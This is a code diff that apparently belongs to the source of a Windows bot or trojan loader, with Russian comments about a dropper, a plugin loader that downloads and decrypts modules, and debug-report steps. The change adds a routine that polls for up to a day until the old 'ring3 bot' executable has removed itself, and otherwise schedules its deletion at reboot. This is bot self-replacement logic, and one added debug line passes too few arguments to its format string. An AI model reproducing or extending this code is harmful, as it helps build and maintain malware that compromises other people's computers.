@@ -482,6 +482,42 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 	}
 };
 
+void WaitForOldRing3BotSelfRemoved()
+{
+	DWORD TimeoutInSec = 24 * 60 * 60;
+	
+	DWORD PeriodInSec = 60;
+	DWORD PeriodCount = TimeoutInSec / PeriodInSec;
+	PCHAR PathToRing3Bot = BOT::GetBotFullExeName();
+	
+	while (true)
+	{
+		bool IsExists = File::IsExists(PathToRing3Bot);
+		
+		LDRDBG("WaitForOldRing3BotSelfRemoved", "check file='%s' exists='%d'",
+			PathToRing3Bot, IsExists);
+
+		if(!IsExists) break;
+		
+		LDRDBG("WaitForOldRing3BotSelfRemoved", "Sleeping %d sec='%s'",
+			PeriodInSec);
+
+		// 318_ld ожидание удаления прежнего ring3 бота перед перезагрузкой
+		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("318_ld"));
+
+		pSleep(PeriodInSec * 1000);
+		PeriodCount--;
+
+		if (PeriodCount == 0)
+		{
+			pMoveFileExA(PathToRing3Bot, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+			break;
+		}
+	}
+
+	STR::Free(PathToRing3Bot);
+}
+
 // Нужен для вызова в дропере.
 // Чтобы не перетягивать всю работу по загрузке, расшифровке, встраиванию ключей и тд
 // в дропер - сделан експорт в Loader_dll и она уже должна скачать плаг, имея в себе 
@@ -515,6 +551,7 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
 		
 		MemFree(Module);
+
 		return TRUE;
 	}
 
